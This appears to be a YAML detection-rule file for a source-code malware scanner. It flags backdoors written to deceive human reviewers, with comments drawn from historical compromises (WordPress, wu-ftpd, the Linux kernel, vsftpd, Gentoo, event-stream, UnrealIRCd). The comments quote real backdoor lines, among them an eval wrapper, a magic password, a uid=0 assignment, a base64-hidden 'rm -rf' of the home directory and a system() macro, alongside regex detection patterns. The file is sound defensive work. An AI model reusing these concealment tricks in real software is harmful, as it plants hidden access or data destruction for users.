# Source written to be misread by the person reviewing it.
#
# A backdoor that survives code review does not hide from the compiler, it
# hides from a reader skimming a diff. Two of the oldest supply-chain
# compromises in this corpus use the same trick from opposite directions: name
# the dangerous thing after a safe one, or write the dangerous thing so it
# looks like a familiar safe idiom.
#
# WordPress 2.1.1 (2007) added `comment_text_phpfilter($d) { eval($d); }` to
# wp-includes/feed.php, beside the file's real `comment_text_rss`. A reviewer
# scanning function names sees another content filter.
#
# wu-ftpd 2.1f/2.2 (1994) conjoined `strcmp(passwd, "NULL")` into the password
# failure predicate. That reads as a null check -- which is exactly what the
# surrounding lines do, two of them testing `*pw->pw_passwd == '\0'`. It is
# not a null check. It compares the supplied password against the four
# characters N, U, L, L, and typing that as your password logs you in as
# anyone.
#
# These are stated separately from the rules that describe what the code does
# because they describe something different: not the capability, but the
# effort spent making the capability unreadable. A finding here tells a
# reviewer the deception was deliberate, which no capability rule establishes.
defaults:
  platforms: [unix, windows]
  attack: T1036
  mbc: F0001

traits:
  - id: comparison-then-assignment-in-one-condition
    desc: Condition compares then assigns
    crit: suspicious
    conf: 0.93
    for: [c, cpp, text]
    # `if ((options == (A|B)) && (current->uid = 0))`. The reader parses a
    # real `==` first, and the eye carries that reading into the second
    # clause, where a single `=` is doing the work. Requiring both operators
    # in one predicate is what separates this from an ordinary assignment
    # someone wrote deliberately, which stands alone.
    if:
      type: text
      regex: '==[^;\n]{0,60}&&[^;\n]{0,20}(->|\.)(e|s|fs)?[ug]id\s*=\s*0'


  - id: base64-decoded-command-default
    desc: Command name decoded from base64
    crit: notable
    conf: 0.93
    for: [shell, makefile, text]
    # `meson=${meson:-`base64 -d <<< L2Jpbi9ybQo=`}`. The `:-` default idiom
    # is ordinary shell; what is being defaulted is not. A build script names
    # its tools in plain text -- there is no portability or escaping reason to
    # encode `/bin/rm`, only a reading reason.
    if:
      type: text
      regex: '\$\{[A-Za-z_]\w{0,20}:-[^}]{0,30}base64\s+-d'

composite_rules:
  - id: execution-sink-named-as-sanitiser
    desc: Exec sink named as a data sanitiser
    crit: hostile
    conf: 0.96
    for: [php, text]
    near_lines: 1
    # A function whose entire body is eval/passthru/shell_exec, carrying a name
    # from the vocabulary of input sanitisation. The capability rule in
    # backdoor/webshell states that the wrapper runs request input; this states
    # that it was dressed up as the opposite of what it is, which is why it
    # sat in a core WordPress file for weeks.
    all:
      - id: objectives/command-and-control/backdoor/webshell/wrapper::function-body-is-execution-sink
      - id: "metadata/lang/source/naming/action/function-name::php-sanitizer-named-function"
    unless:
      - id: metadata/package/testing/

      - id: metadata/path::test-directory-component
  - id: credential-backdoor-disguised-as-null-check
    desc: Magic credential disguised as null check
    crit: hostile
    conf: 0.95
    for: [c, cpp, text]
    near_lines: 3
    # The absence-word comparison sitting in the same predicate as the real
    # password check. Either half alone is explainable; together they are a
    # magic credential written to be skimmed past.
    all:
      - id: metadata/lang/source/syntax/conditional::password-absence-word-comparison
      - id: micro-behaviors/os/security/auth/password::strcmp-password-field
    unless:
      - id: metadata/package/testing/

      - id: metadata/path::test-directory-component
  - id: privilege-assignment-behind-decoy-branch
    desc: Decoy branch hides a privilege assignment
    crit: hostile
    conf: 0.95
    for: [c, cpp, text]
    near_lines: 4
    # The Linux kernel/exit.c injection of November 2003, stated as the
    # deception rather than the effect. Two lines were added to sys_wait4:
    #
    #   if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
    #           retval = -EINVAL;
    #   retval = -ECHILD;
    #
    # The branch body is dead -- the next unconditional line overwrites it --
    # and -EINVAL is the same code the function's real argument validation
    # returns at the top, so the whole thing reads as a late options check.
    # It does nothing. The work is the `=` in the condition, which makes the
    # caller root. A branch whose body cannot outlive the following statement
    # is not a check; it is cover for whatever the condition did.
    #
    # Either tell is enough: the mixed comparison, or the dead branch.
    all:
      - id: objectives/privilege-escalation/elevation-control/setuid/source::privilege-field-assigned-in-condition
    any:
      - id: comparison-then-assignment-in-one-condition
      - id: micro-behaviors/os/exception/error-handling::negative-errno-assignment-repeated
    unless:
      - id: metadata/package/testing/

      - id: metadata/path::test-directory-component
  - id: magic-byte-trigger-in-character-scanner
    desc: Magic byte test inside a character scanner
    crit: hostile
    conf: 0.95
    for: [c, cpp, text]
    # The check is a few lines smuggled into a helper. A multi-megabyte
    # amalgamation has ctype wrappers and byte tests in unrelated functions;
    # proximity already separates those when it is applied, and the size cap
    # covers scanners that score the member as one bag of strings.
    size_max: 1048576
    near_lines: 8
    # vsftpd 2.3.4. The command-and-control rules state that a magic byte
    # sequence dispatches a bind shell. This states where the attacker put
    # the test: inside `str_contains_space()`, a helper whose entire job is
    # deciding whether a string has whitespace in it. The loop calls
    # `vsf_sysutil_isspace()` on each byte, and the injected lines sit in the
    # `else` arm looking for 0x3a 0x29 -- a smiley.
    #
    # Nobody audits a whitespace helper. That is the whole reason it is there,
    # and it is a different fact from the trigger existing: it tells a reviewer
    # the author chose a function where the addition would read as parsing,
    # and it generalises to any signature check smuggled into a byte loop
    # whose stated purpose is character classification.
    all:
      - id: micro-behaviors/data/buffer/read::nearby-indexed-byte-hex-comparisons
      - id: micro-behaviors/data/string/case::ctype-class-test-call
    unless:
      - id: metadata/package/testing/

      - id: metadata/path::test-directory-component
  - id: build-execs-base64-hidden-command
    desc: Build execs a base64-hidden command
    crit: hostile
    conf: 0.95
    for: [shell, makefile, text]
    near_lines: 40
    # The Gentoo `configure` wrapper of the 2018 GitHub-organisation
    # compromise. Its last line is
    #
    #   exec ${meson} -rf build "${args[@]}" $HOME ~/
    #
    # which reads as handing the build over to meson. `${meson}` was defaulted
    # at the top of the file to a base64 blob decoding to `/bin/rm`, so the
    # line actually runs `rm -rf` across the invoking user's home directory.
    #
    # The impact rules state what it destroys. This states why nobody caught
    # it while reading: every token on the executing line is plausible, and
    # the one that is not is defined twenty lines earlier in an idiom that
    # exists to look unremarkable. Encoding a *command name* -- as opposed to
    # data -- has no benign purpose in a build script.
    all:
      - id: base64-decoded-command-default
      - id: micro-behaviors/process/create/exec::shell-exec-variable-command
    unless:
      - id: metadata/package/testing/

      - id: metadata/path::test-directory-component
  - id: payload-hidden-in-test-fixture
    desc: Test fixture carries an executable payload
    crit: hostile
    conf: 0.95
    for: [javascript, typescript]
    # flatmap-stream, the dependency slipped into event-stream, kept its
    # payload in `test/data.js`. The supply-chain rules describe the loader
    # that decrypts and compiles it. This describes where it was parked.
    #
    # A test directory is the one place in a package that reviewers, linters
    # and publish-time checks all skip by design, and where a large opaque
    # blob is unremarkable -- fixtures are supposed to be inert data. That is
    # the whole reason to put a cipher payload there rather than beside the
    # code that loads it. sendmail 8.12.6 used the same hiding place twenty
    # years earlier for the same reason, which is why this is stated as its
    # own technique rather than folded into whichever loader happens to
    # collect it.
    #
    # The test-path traits are used as positive evidence here. They are the
    # finding, not a reason to suppress one -- the opposite of the
    # directory-wide `unless:` mistake documented on the sibling stego rule.
    all:
      - id: metadata/path::test-directory-component
      - id: metadata/file/encoding/shape::large-base64-like-literal
    any:
      - id: micro-behaviors/crypto/symmetric/aes/runtime-library::create-decipher-hex-hidden
      - id: micro-behaviors/os/module/load::module-compile-hex-hidden

  - id: logging-named-macro-runs-commands
    desc: Debug-named macro expands to system
    crit: hostile
    conf: 0.95
    for: [c]
    # UnrealIRCd 3.2.8.1. The backdoor is three preprocessor lines added to
    # `include/struct.h`, and the load-bearing one is:
    #
    #   #define DEBUG3_DOLOG_SYSTEM(x) system(x)
    #
    # Every use of it is written `DEBUG3_LOG(x)`, so the call sites read as
    # logging. The name is not merely innocuous, it is drawn from the
    # project's own debug vocabulary and defined among its real DEBUGMODE
    # macros, which is why the addition survived review and shipped for seven
    # months.
    #
    # The dispatch rules describe the trigger -- a magic "AB" prefix on an
    # inbound line. This describes the concealment, and it is the half that
    # generalises: any macro that promises to log and delivers execution puts
    # a `system()` behind a name a reader will skip.
    all:
      - id: micro-behaviors/process/create/shell/native::c-debug-system-macro-wrapper
    any:
      - id: objectives/command-and-control/backdoor/dispatch/shell/source::debug-macro-system-wrapper
      - id: objectives/command-and-control/backdoor/dispatch/shell/source::source-tree-debug-macro-command-trigger
